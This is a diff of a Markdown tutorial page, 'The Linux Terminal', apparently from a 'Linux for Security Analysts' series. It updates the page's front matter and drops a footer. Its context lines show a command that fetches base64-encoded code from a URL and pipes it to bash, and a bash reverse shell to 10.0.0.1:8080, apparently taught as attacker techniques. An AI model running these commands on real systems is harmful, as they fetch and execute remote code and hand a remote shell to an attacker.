@@ -1,7 +1,9 @@
 ---
-layout: page
-title: "4. The Linux Terminal"
+layout: series
+title: The Linux Terminal
 permalink: /linux-overview/terminal/
+series: Linux for Security Analysts
+weight: 4.0
 ---
 
 ## Overview
@@ -68,10 +70,3 @@ $ (curl -fsSL $URL || wget -q -O- $URL) | base64 -d | /bin/bash
 ```sh
 $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
-
----
-
-<footer>
-  <br>
-  <a href="/linux-overview/">Back to Linux for Security Analysts</a>
-</footer>
